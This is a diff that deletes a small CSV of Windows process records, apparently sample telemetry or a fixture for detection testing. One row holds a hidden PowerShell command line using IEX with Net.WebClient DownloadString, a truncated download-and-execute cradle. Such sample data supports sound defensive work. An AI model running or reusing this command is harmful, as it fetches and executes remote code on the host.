@@ -1,3 +1,0 @@
-creationdate,processname,parentprocessid,processid,sessionid,commandline
-20260114152343.399323+000,svchost.exe,500,1200,0,C:\Windows\system32\svchost.exe -k netsvcs
-20260114142343.399777+000,powershell.exe,2300,4500,1,"powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString..."""
